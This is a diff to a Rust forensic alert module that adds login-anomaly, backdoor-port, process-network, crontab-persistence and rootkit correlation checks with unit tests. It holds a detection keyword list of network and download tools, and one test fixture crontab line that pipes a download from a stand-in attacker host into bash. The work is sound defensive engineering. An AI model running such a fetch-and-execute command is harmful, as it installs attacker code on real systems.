@@ -13,6 +13,7 @@ use rt_parser_uac::parsers::network::NetworkConnection;
 use rt_parser_uac::parsers::packages::InstalledPackage;
 use rt_parser_uac::parsers::process::{CrontabEntry, ProcessInfo};
 use rt_parser_uac::parsers::rootkit::RootkitFinding;
+use rt_parser_uac::parsers::system::LoginRecord;
 use rt_signatures::heuristics::AnomalyIndex;
 use rt_signatures::matching::results::Severity;
 
@@ -63,6 +64,7 @@ pub struct AlertInput<'a> {
     pub configs: &'a [ConfigFile],
     pub hashes: &'a [HashedExecutable],
     pub packages: &'a [InstalledPackage],
+    pub logins: &'a [LoginRecord],
 }
 
 // ---------------------------------------------------------------------------
@@ -76,8 +78,10 @@ pub struct AlertInput<'a> {
 pub fn detect_alerts(input: &AlertInput<'_>) -> Vec<Alert> {
     let mut alerts = Vec::new();
 
+    // --- Per-category checks ---
     check_network_alerts(input.network, &mut alerts);
     check_unattributed_connections(input.network, &mut alerts);
+    check_suspicious_listeners(input.network, &mut alerts);
     check_process_alerts(input.processes, &mut alerts);
     check_chkrootkit_alerts(input.chkrootkit, &mut alerts);
     check_rootkit_finding_alerts(
@@ -88,6 +92,17 @@ pub fn detect_alerts(input: &AlertInput<'_>) -> Vec<Alert> {
     );
     check_config_alerts(input.configs, input.crontabs, &mut alerts);
     check_bodyfile_alerts(input.bodyfile, &mut alerts);
+    check_login_anomalies(input.logins, &mut alerts);
+
+    // --- Cross-parser correlation checks ---
+    check_process_network_correlation(input.processes, input.network, input.hashes, &mut alerts);
+    check_persistence_correlation(input.crontabs, input.bodyfile, &mut alerts);
+    check_rootkit_compound_indicators(
+        input.rootkit_findings,
+        input.network,
+        input.crontabs,
+        &mut alerts,
+    );
 
     alerts.sort_by_key(|a| a.severity);
     alerts
@@ -419,6 +434,337 @@ fn parse_octal_mode(mode_str: &str) -> u32 {
 }
 
 // ---------------------------------------------------------------------------
+// Login anomaly checks
+// ---------------------------------------------------------------------------
+
+/// Detect suspicious login patterns from parsed `last` output.
+///
+/// Detects:
+/// - Root login from a remote host (Critical)
+/// - Login source that appears only once across all records (Warning)
+fn check_login_anomalies(logins: &[LoginRecord], alerts: &mut Vec<Alert>) {
+    // Count occurrences of each non-empty login source
+    let mut source_counts: std::collections::HashMap<&str, usize> =
+        std::collections::HashMap::new();
+    for login in logins {
+        let src = login.source.as_str();
+        if !src.is_empty() {
+            *source_counts.entry(src).or_insert(0) += 1;
+        }
+    }
+
+    for login in logins {
+        let src = login.source.as_str();
+
+        // Root login from remote host (non-empty, non-local source)
+        if login.user == "root" && !src.is_empty() && src != "localhost" && !src.starts_with(':') {
+            alerts.push(Alert {
+                severity: AlertSeverity::Critical,
+                category: "auth".into(),
+                message: format!("Remote root login from {src}"),
+                detail: format!(
+                    "user={} terminal={} source={} time={}",
+                    login.user,
+                    login.terminal,
+                    src,
+                    login.login_time.as_deref().unwrap_or("unknown")
+                ),
+            });
+        }
+
+        // Unique login source — appears exactly once
+        if !src.is_empty() && source_counts.get(src) == Some(&1) && logins.len() > 1 {
+            alerts.push(Alert {
+                severity: AlertSeverity::Warning,
+                category: "auth".into(),
+                message: format!("Unique login source: {src} (seen only once)"),
+                detail: format!(
+                    "user={} terminal={} source={} time={}",
+                    login.user,
+                    login.terminal,
+                    src,
+                    login.login_time.as_deref().unwrap_or("unknown")
+                ),
+            });
+        }
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Suspicious listener checks
+// ---------------------------------------------------------------------------
+
+/// Known backdoor / pentest tool ports.
+const SUSPICIOUS_PORTS: &[u16] = &[
+    4444, 5555, 6666, 6667, 7777, 8888, 9999, 1337, 31337, 4445, 3333,
+];
+
+/// Flag LISTEN sockets on commonly-used backdoor ports.
+fn check_suspicious_listeners(network: &[NetworkConnection], alerts: &mut Vec<Alert>) {
+    for conn in network {
+        if !conn.state.eq_ignore_ascii_case("LISTEN") {
+            continue;
+        }
+
+        // Extract port from local_addr (e.g. "0.0.0.0:4444" → 4444)
+        let port = conn
+            .local_addr
+            .rsplit_once(':')
+            .and_then(|(_, p)| p.parse::<u16>().ok());
+
+        if let Some(port) = port {
+            if SUSPICIOUS_PORTS.contains(&port) {
+                alerts.push(Alert {
+                    severity: AlertSeverity::Warning,
+                    category: "network".into(),
+                    message: format!(
+                        "Suspicious listener on port {port} (known backdoor/pentest port)"
+                    ),
+                    detail: format!(
+                        "proto={} local={} program={}",
+                        conn.protocol,
+                        conn.local_addr,
+                        conn.program.as_deref().unwrap_or("unknown")
+                    ),
+                });
+            }
+        }
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Cross-parser correlation: process × network
+// ---------------------------------------------------------------------------
+
+/// Cross-correlate processes with their network connections.
+///
+/// Detects:
+/// - Temp-dir process with active network connection (Critical)
+/// - Connection PID not found in process list — hidden process (Warning)
+///
+/// When a match is found, the alert detail is enriched with the executable
+/// hash if available in `hashes`.
+fn check_process_network_correlation(
+    processes: &[ProcessInfo],
+    network: &[NetworkConnection],
+    hashes: &[HashedExecutable],
+    alerts: &mut Vec<Alert>,
+) {
+    let temp_prefixes = ["/tmp/", "/dev/shm/", "/var/tmp/"];
+    let active_states = ["ESTAB", "LISTEN", "SYN"];
+
+    for conn in network {
+        let Some(pid) = conn.pid else { continue };
+
+        let state_upper = conn.state.to_uppercase();
+        let is_active = active_states.iter().any(|s| state_upper.contains(s));
+        if !is_active {
+            continue;
+        }
+
+        match processes.iter().find(|p| p.pid == pid) {
+            Some(proc) => {
+                let cmd = proc.command.as_str();
+                // Check if the process executable is in a temp directory
+                for prefix in &temp_prefixes {
+                    if cmd.starts_with(prefix) || cmd.contains(&format!(" {prefix}")) {
+                        let exe_path = cmd.split_whitespace().next().unwrap_or(cmd);
+                        let hash_info = hashes
+                            .iter()
+                            .find(|h| h.path == exe_path)
+                            .map(|h| format!(" | {}={}", h.algorithm, h.hash))
+                            .unwrap_or_default();
+
+                        alerts.push(Alert {
+                            severity: AlertSeverity::Critical,
+                            category: "correlation".into(),
+                            message: format!(
+                                "Temp-dir process with active network connection ({prefix})"
+                            ),
+                            detail: format!(
+                                "pid={pid} cmd={cmd} local={} remote={} state={}{}",
+                                conn.local_addr, conn.remote_addr, conn.state, hash_info
+                            ),
+                        });
+                        break;
+                    }
+                }
+            }
+            None => {
+                // PID from connection not in process list — possible hidden process
+                alerts.push(Alert {
+                    severity: AlertSeverity::Warning,
+                    category: "correlation".into(),
+                    message: format!(
+                        "Connection PID {pid} not in process list (possible hidden process)"
+                    ),
+                    detail: format!(
+                        "pid={pid} proto={} local={} remote={} state={}",
+                        conn.protocol, conn.local_addr, conn.remote_addr, conn.state
+                    ),
+                });
+            }
+        }
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Cross-parser correlation: crontab × bodyfile (persistence)
+// ---------------------------------------------------------------------------
+
+/// Detect persistence mechanisms by cross-referencing crontabs with bodyfile.
+///
+/// Detects:
+/// - Crontab scheduling execution of a file in a temp directory,
+///   enriched with bodyfile metadata when the payload exists on disk (Critical)
+/// - Crontab referencing a temp-dir file that is NOT in the bodyfile,
+///   suggesting cleanup after deployment (Warning)
+fn check_persistence_correlation(
+    crontabs: &[CrontabEntry],
+    bodyfile: &[BodyfileEntry],
+    alerts: &mut Vec<Alert>,
+) {
+    let temp_prefixes = ["/tmp/", "/dev/shm/", "/var/tmp/"];
+
+    for entry in crontabs {
+        // Extract tokens that look like absolute paths in temp directories
+        for token in entry.command.split_whitespace() {
+            let is_temp_path = temp_prefixes.iter().any(|p| token.starts_with(p));
+            if !is_temp_path {
+                continue;
+            }
+            // Strip trailing shell operators (;, &&, |, etc.)
+            let path = token.trim_end_matches(|c: char| {
+                !c.is_alphanumeric() && c != '/' && c != '.' && c != '_' && c != '-'
+            });
+
+            if let Some(bf) = bodyfile.iter().find(|b| b.path == path) {
+                alerts.push(Alert {
+                    severity: AlertSeverity::Critical,
+                    category: "correlation".into(),
+                    message: format!("Crontab persistence: scheduled execution of {path}"),
+                    detail: format!(
+                        "user={} schedule={} | file: size={} mode={} mtime={}",
+                        entry.user,
+                        entry.schedule,
+                        bf.size,
+                        bf.mode,
+                        bf.mtime.unwrap_or(0)
+                    ),
+                });
+            } else {
+                alerts.push(Alert {
+                    severity: AlertSeverity::Warning,
+                    category: "correlation".into(),
+                    message: format!("Crontab references missing temp file: {path}"),
+                    detail: format!(
+                        "user={} schedule={} cmd={} | file not found in bodyfile",
+                        entry.user, entry.schedule, entry.command
+                    ),
+                });
+            }
+            break; // Only flag first temp path per crontab entry
+        }
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Cross-parser correlation: rootkit compound indicators
+// ---------------------------------------------------------------------------
+
+/// Escalate when multiple independent rootkit indicators co-occur.
+///
+/// Detects:
+/// - Rootkit findings + unattributed network listener → compound Critical
+/// - Rootkit findings + suspicious crontab → persistence Warning
+/// - Rootkit findings spanning 2+ check categories → multi-vector Critical
+fn check_rootkit_compound_indicators(
+    rootkit_findings: &[RootkitFinding],
+    network: &[NetworkConnection],
+    crontabs: &[CrontabEntry],
+    alerts: &mut Vec<Alert>,
+) {
+    use rt_parser_uac::parsers::rootkit::RootkitSeverity;
+
+    if rootkit_findings.is_empty() {
+        return;
+    }
+
+    let has_critical_rootkit = rootkit_findings
+        .iter()
+        .any(|f| matches!(f.severity, RootkitSeverity::Critical));
+
+    // Compound: rootkit + unattributed network listener
+    let unattributed_count = network
+        .iter()
+        .filter(|c| {
+            c.pid.is_none() && {
+                let s = c.state.to_uppercase();
+                s.contains("LISTEN") || s.contains("ESTAB")
+            }
+        })
+        .count();
+
+    if has_critical_rootkit && unattributed_count > 0 {
+        alerts.push(Alert {
+            severity: AlertSeverity::Critical,
+            category: "correlation".into(),
+            message: "Rootkit activity with hidden network listener (compound indicator)".into(),
+            detail: format!(
+                "critical rootkit findings: {} | unattributed connections: {unattributed_count}",
+                rootkit_findings
+                    .iter()
+                    .filter(|f| matches!(f.severity, RootkitSeverity::Critical))
+                    .count(),
+            ),
+        });
+    }
+
+    // Compound: rootkit + suspicious crontab → persistence
+    let suspicious_commands = ["wget", "curl", "base64", "nc", "ncat"];
+    let has_suspicious_crontab = crontabs.iter().any(|e| {
+        let cmd_lower = e.command.to_lowercase();
+        suspicious_commands.iter().any(|k| cmd_lower.contains(k))
+    });
+
+    if !rootkit_findings.is_empty() && has_suspicious_crontab {
+        alerts.push(Alert {
+            severity: AlertSeverity::Warning,
+            category: "correlation".into(),
+            message: "Rootkit indicators with suspicious scheduled task (persistence)".into(),
+            detail: format!(
+                "rootkit checks: {} | suspicious crontabs: {}",
+                rootkit_findings.len(),
+                crontabs
+                    .iter()
+                    .filter(|e| {
+                        let cmd_lower = e.command.to_lowercase();
+                        suspicious_commands.iter().any(|k| cmd_lower.contains(k))
+                    })
+                    .count()
+            ),
+        });
+    }
+
+    // Multi-vector: rootkit findings spanning 2+ different check categories
+    let check_types: std::collections::HashSet<&str> =
+        rootkit_findings.iter().map(|f| f.check.as_str()).collect();
+    if check_types.len() >= 2 {
+        let mut checks: Vec<&str> = check_types.into_iter().collect();
+        checks.sort_unstable();
+        alerts.push(Alert {
+            severity: AlertSeverity::Critical,
+            category: "correlation".into(),
+            message: format!(
+                "Multi-vector rootkit indicators across {} categories",
+                checks.len()
+            ),
+            detail: format!("affected checks: {}", checks.join(", ")),
+        });
+    }
+}
+
+// ---------------------------------------------------------------------------
 // MFT anomaly → alert conversion
 // ---------------------------------------------------------------------------
 
@@ -472,6 +818,7 @@ mod tests {
             configs: &[],
             hashes: &[],
             packages: &[],
+            logins: &[],
         }
     }
 
@@ -1102,6 +1449,521 @@ mod tests {
         assert!(
             !alerts.iter().any(|a| a.message.contains("Unattributed")),
             "should not flag CLOSE-WAIT, got: {alerts:?}"
+        );
+    }
+
+    // =====================================================================
+    // Process-network correlation
+    // =====================================================================
+
+    #[test]
+    fn temp_process_with_network_connection_critical() {
+        let procs = vec![ProcessInfo {
+            pid: 1234,
+            ppid: 1,
+            user: "www-data".into(),
+            command: "/tmp/beacon".into(),
+            cpu_pct: None,
+            mem_pct: None,
+            start_time: None,
+        }];
+        let conns = vec![NetworkConnection {
+            protocol: "tcp".into(),
+            local_addr: "192.168.1.10:45678".into(),
+            remote_addr: "10.0.0.5:443".into(),
+            state: "ESTAB".into(),
+            pid: Some(1234),
+            program: Some("/tmp/beacon".into()),
+        }];
+        let input = AlertInput {
+            processes: &procs,
+            network: &conns,
+            ..empty_input()
+        };
+        let alerts = detect_alerts(&input);
+        assert!(
+            alerts.iter().any(|a| a.severity == AlertSeverity::Critical
+                && a.category == "correlation"
+                && a.message.contains("/tmp/")),
+            "expected critical correlation alert for temp process with network, got: {alerts:?}"
+        );
+    }
+
+    #[test]
+    fn temp_process_with_network_includes_hash_enrichment() {
+        let procs = vec![ProcessInfo {
+            pid: 42,
+            ppid: 1,
+            user: "nobody".into(),
+            command: "/dev/shm/.hidden".into(),
+            cpu_pct: None,
+            mem_pct: None,
+            start_time: None,
+        }];
+        let conns = vec![NetworkConnection {
+            protocol: "tcp".into(),
+            local_addr: "0.0.0.0:9999".into(),
+            remote_addr: "0.0.0.0:*".into(),
+            state: "LISTEN".into(),
+            pid: Some(42),
+            program: Some(".hidden".into()),
+        }];
+        let hashes = vec![HashedExecutable {
+            hash: "deadbeefcafe1234".into(),
+            path: "/dev/shm/.hidden".into(),
+            algorithm: "md5".into(),
+        }];
+        let input = AlertInput {
+            processes: &procs,
+            network: &conns,
+            hashes: &hashes,
+            ..empty_input()
+        };
+        let alerts = detect_alerts(&input);
+        let corr: Vec<_> = alerts
+            .iter()
+            .filter(|a| a.category == "correlation" && a.message.contains("/dev/shm/"))
+            .collect();
+        assert!(!corr.is_empty(), "expected correlation alert");
+        assert!(
+            corr[0].detail.contains("deadbeefcafe1234"),
+            "expected hash in detail, got: {}",
+            corr[0].detail
+        );
+    }
+
+    #[test]
+    fn connection_pid_not_in_process_list_flagged() {
+        let procs = vec![ProcessInfo {
+            pid: 1,
+            ppid: 0,
+            user: "root".into(),
+            command: "/sbin/init".into(),
+            cpu_pct: None,
+            mem_pct: None,
+            start_time: None,
+        }];
+        let conns = vec![NetworkConnection {
+            protocol: "tcp".into(),
+            local_addr: "0.0.0.0:4444".into(),
+            remote_addr: "0.0.0.0:*".into(),
+            state: "LISTEN".into(),
+            pid: Some(9999),
+            program: None,
+        }];
+        let input = AlertInput {
+            processes: &procs,
+            network: &conns,
+            ..empty_input()
+        };
+        let alerts = detect_alerts(&input);
+        assert!(
+            alerts
+                .iter()
+                .any(|a| a.category == "correlation" && a.detail.contains("9999")),
+            "expected alert for PID not in process list, got: {alerts:?}"
+        );
+    }
+
+    #[test]
+    fn normal_system_process_with_connection_no_correlation_alert() {
+        let procs = vec![ProcessInfo {
+            pid: 100,
+            ppid: 1,
+            user: "root".into(),
+            command: "/usr/sbin/sshd".into(),
+            cpu_pct: None,
+            mem_pct: None,
+            start_time: None,
+        }];
+        let conns = vec![NetworkConnection {
+            protocol: "tcp".into(),
+            local_addr: "0.0.0.0:22".into(),
+            remote_addr: "0.0.0.0:*".into(),
+            state: "LISTEN".into(),
+            pid: Some(100),
+            program: Some("sshd".into()),
+        }];
+        let input = AlertInput {
+            processes: &procs,
+            network: &conns,
+            ..empty_input()
+        };
+        let alerts = detect_alerts(&input);
+        assert!(
+            !alerts
+                .iter()
+                .any(|a| a.category == "correlation" && a.message.contains("sshd")),
+            "should not flag normal sshd, got: {alerts:?}"
+        );
+    }
+
+    // =====================================================================
+    // Login anomaly detection
+    // =====================================================================
+
+    #[test]
+    fn root_login_from_remote_host_critical() {
+        let logins = vec![LoginRecord {
+            user: "root".into(),
+            terminal: "pts/0".into(),
+            source: "10.0.0.50".into(),
+            login_time: Some("Mon Mar 24 10:00 2026".into()),
+            logout_time: None,
+            duration: None,
+        }];
+        let input = AlertInput {
+            logins: &logins,
+            ..empty_input()
+        };
+        let alerts = detect_alerts(&input);
+        assert!(
+            alerts.iter().any(|a| a.severity == AlertSeverity::Critical
+                && a.category == "auth"
+                && a.message.contains("root")),
+            "expected critical root remote login alert, got: {alerts:?}"
+        );
+    }
+
+    #[test]
+    fn root_login_local_console_not_flagged() {
+        let logins = vec![LoginRecord {
+            user: "root".into(),
+            terminal: "tty1".into(),
+            source: String::new(),
+            login_time: Some("Mon Mar 24 10:00 2026".into()),
+            logout_time: None,
+            duration: None,
+        }];
+        let input = AlertInput {
+            logins: &logins,
+            ..empty_input()
+        };
+        let alerts = detect_alerts(&input);
+        assert!(
+            !alerts
+                .iter()
+                .any(|a| a.category == "auth" && a.severity == AlertSeverity::Critical),
+            "should not flag local console root login as critical, got: {alerts:?}"
+        );
+    }
+
+    #[test]
+    fn unique_login_source_flagged() {
+        let logins = vec![
+            LoginRecord {
+                user: "admin".into(),
+                terminal: "pts/0".into(),
+                source: "192.168.1.100".into(),
+                login_time: None,
+                logout_time: None,
+                duration: None,
+            },
+            LoginRecord {
+                user: "admin".into(),
+                terminal: "pts/1".into(),
+                source: "192.168.1.100".into(),
+                login_time: None,
+                logout_time: None,
+                duration: None,
+            },
+            LoginRecord {
+                user: "admin".into(),
+                terminal: "pts/2".into(),
+                source: "10.99.99.99".into(),
+                login_time: None,
+                logout_time: None,
+                duration: None,
+            },
+        ];
+        let input = AlertInput {
+            logins: &logins,
+            ..empty_input()
+        };
+        let alerts = detect_alerts(&input);
+        assert!(
+            alerts.iter().any(|a| a.category == "auth"
+                && a.message.contains("Unique login source")
+                && a.detail.contains("10.99.99.99")),
+            "expected unique source alert for 10.99.99.99, got: {alerts:?}"
+        );
+    }
+
+    #[test]
+    fn all_same_login_source_no_unique_alert() {
+        let logins = vec![
+            LoginRecord {
+                user: "admin".into(),
+                terminal: "pts/0".into(),
+                source: "192.168.1.100".into(),
+                login_time: None,
+                logout_time: None,
+                duration: None,
+            },
+            LoginRecord {
+                user: "admin".into(),
+                terminal: "pts/1".into(),
+                source: "192.168.1.100".into(),
+                login_time: None,
+                logout_time: None,
+                duration: None,
+            },
+        ];
+        let input = AlertInput {
+            logins: &logins,
+            ..empty_input()
+        };
+        let alerts = detect_alerts(&input);
+        assert!(
+            !alerts
+                .iter()
+                .any(|a| a.message.contains("Unique login source")),
+            "should not flag when all sources are the same, got: {alerts:?}"
+        );
+    }
+
+    // =====================================================================
+    // Suspicious listener detection
+    // =====================================================================
+
+    #[test]
+    fn listener_on_backdoor_port_flagged() {
+        let conns = vec![NetworkConnection {
+            protocol: "tcp".into(),
+            local_addr: "0.0.0.0:4444".into(),
+            remote_addr: "0.0.0.0:*".into(),
+            state: "LISTEN".into(),
+            pid: Some(1234),
+            program: Some("nc".into()),
+        }];
+        let input = AlertInput {
+            network: &conns,
+            ..empty_input()
+        };
+        let alerts = detect_alerts(&input);
+        assert!(
+            alerts
+                .iter()
+                .any(|a| a.message.contains("4444") && a.category == "network"),
+            "expected suspicious port alert for 4444, got: {alerts:?}"
+        );
+    }
+
+    #[test]
+    fn listener_on_standard_port_not_flagged_as_suspicious() {
+        let conns = vec![NetworkConnection {
+            protocol: "tcp".into(),
+            local_addr: "0.0.0.0:80".into(),
+            remote_addr: "0.0.0.0:*".into(),
+            state: "LISTEN".into(),
+            pid: Some(100),
+            program: Some("nginx".into()),
+        }];
+        let input = AlertInput {
+            network: &conns,
+            ..empty_input()
+        };
+        let alerts = detect_alerts(&input);
+        assert!(
+            !alerts
+                .iter()
+                .any(|a| a.message.contains("suspicious") || a.message.contains("Suspicious")),
+            "should not flag port 80 as suspicious, got: {alerts:?}"
+        );
+    }
+
+    // =====================================================================
+    // Persistence correlation (crontab × bodyfile)
+    // =====================================================================
+
+    #[test]
+    fn crontab_tmp_file_in_bodyfile_critical() {
+        let crontabs = vec![CrontabEntry {
+            schedule: "*/5 * * * *".into(),
+            command: "/tmp/updater.sh".into(),
+            user: "root".into(),
+        }];
+        let bodyfile = vec![BodyfileEntry {
+            md5: String::new(),
+            path: "/tmp/updater.sh".into(),
+            inode: 500,
+            mode: "100755".into(),
+            uid: 0,
+            gid: 0,
+            size: 2048,
+            atime: None,
+            mtime: Some(1_700_000_000),
+            ctime: None,
+            crtime: None,
+        }];
+        let input = AlertInput {
+            crontabs: &crontabs,
+            bodyfile: &bodyfile,
+            ..empty_input()
+        };
+        let alerts = detect_alerts(&input);
+        assert!(
+            alerts.iter().any(|a| a.severity == AlertSeverity::Critical
+                && a.category == "correlation"
+                && a.message.contains("persistence")
+                && a.detail.contains("size=2048")),
+            "expected persistence alert with bodyfile enrichment, got: {alerts:?}"
+        );
+    }
+
+    #[test]
+    fn crontab_tmp_file_missing_from_bodyfile_warning() {
+        let crontabs = vec![CrontabEntry {
+            schedule: "*/5 * * * *".into(),
+            command: "/tmp/ghost.sh".into(),
+            user: "root".into(),
+        }];
+        let input = AlertInput {
+            crontabs: &crontabs,
+            bodyfile: &[], // empty bodyfile — file not found
+            ..empty_input()
+        };
+        let alerts = detect_alerts(&input);
+        assert!(
+            alerts.iter().any(|a| a.category == "correlation"
+                && a.message.contains("missing")
+                && a.message.contains("/tmp/ghost.sh")),
+            "expected missing temp file alert, got: {alerts:?}"
+        );
+    }
+
+    #[test]
+    fn crontab_normal_command_no_persistence_alert() {
+        let crontabs = vec![CrontabEntry {
+            schedule: "0 2 * * *".into(),
+            command: "/usr/bin/logrotate /etc/logrotate.conf".into(),
+            user: "root".into(),
+        }];
+        let input = AlertInput {
+            crontabs: &crontabs,
+            ..empty_input()
+        };
+        let alerts = detect_alerts(&input);
+        assert!(
+            !alerts
+                .iter()
+                .any(|a| a.category == "correlation" && a.message.contains("persistence")),
+            "should not flag normal logrotate crontab, got: {alerts:?}"
+        );
+    }
+
+    // =====================================================================
+    // Rootkit compound indicators
+    // =====================================================================
+
+    #[test]
+    fn rootkit_plus_unattributed_compound_critical() {
+        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
+        let findings = vec![RootkitFinding {
+            severity: RootkitSeverity::Critical,
+            check: "kernel_module".into(),
+            description: "diamorphine loaded".into(),
+            evidence: "diamorphine".into(),
+        }];
+        let conns = vec![NetworkConnection {
+            protocol: "tcp".into(),
+            local_addr: "0.0.0.0:3333".into(),
+            remote_addr: "0.0.0.0:*".into(),
+            state: "LISTEN".into(),
+            pid: None,
+            program: None,
+        }];
+        let input = AlertInput {
+            rootkit_findings: &findings,
+            network: &conns,
+            ..empty_input()
+        };
+        let alerts = detect_alerts(&input);
+        assert!(
+            alerts.iter().any(|a| a.severity == AlertSeverity::Critical
+                && a.category == "correlation"
+                && a.message.contains("hidden")),
+            "expected compound rootkit+network alert, got: {alerts:?}"
+        );
+    }
+
+    #[test]
+    fn rootkit_plus_suspicious_crontab_persistence_alert() {
+        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
+        let findings = vec![RootkitFinding {
+            severity: RootkitSeverity::Warning,
+            check: "ld_preload".into(),
+            description: "Library in ld.so.preload".into(),
+            evidence: "/lib/libevil.so".into(),
+        }];
+        let crontabs = vec![CrontabEntry {
+            schedule: "*/5 * * * *".into(),
+            command: "curl http://evil.com/update | bash".into(),
+            user: "root".into(),
+        }];
+        let input = AlertInput {
+            rootkit_findings: &findings,
+            crontabs: &crontabs,
+            ..empty_input()
+        };
+        let alerts = detect_alerts(&input);
+        assert!(
+            alerts
+                .iter()
+                .any(|a| a.category == "correlation" && a.message.contains("persistence")),
+            "expected rootkit+crontab persistence alert, got: {alerts:?}"
+        );
+    }
+
+    #[test]
+    fn multi_vector_rootkit_across_categories() {
+        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
+        let findings = vec![
+            RootkitFinding {
+                severity: RootkitSeverity::Critical,
+                check: "kernel_module".into(),
+                description: "diamorphine loaded".into(),
+                evidence: "diamorphine".into(),
+            },
+            RootkitFinding {
+                severity: RootkitSeverity::Warning,
+                check: "ld_preload".into(),
+                description: "Library in ld.so.preload".into(),
+                evidence: "/lib/libevil.so".into(),
+            },
+        ];
+        let input = AlertInput {
+            rootkit_findings: &findings,
+            ..empty_input()
+        };
+        let alerts = detect_alerts(&input);
+        assert!(
+            alerts
+                .iter()
+                .any(|a| a.category == "correlation" && a.message.contains("Multi-vector")),
+            "expected multi-vector rootkit alert, got: {alerts:?}"
+        );
+    }
+
+    #[test]
+    fn single_rootkit_finding_no_compound_alert() {
+        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
+        let findings = vec![RootkitFinding {
+            severity: RootkitSeverity::Info,
+            check: "kernel_taint".into(),
+            description: "Proprietary module".into(),
+            evidence: "taint=1".into(),
+        }];
+        let input = AlertInput {
+            rootkit_findings: &findings,
+            ..empty_input()
+        };
+        let alerts = detect_alerts(&input);
+        assert!(
+            !alerts
+                .iter()
+                .any(|a| a.category == "correlation" && a.message.contains("compound")),
+            "single info finding should not trigger compound alert, got: {alerts:?}"
         );
     }
 }
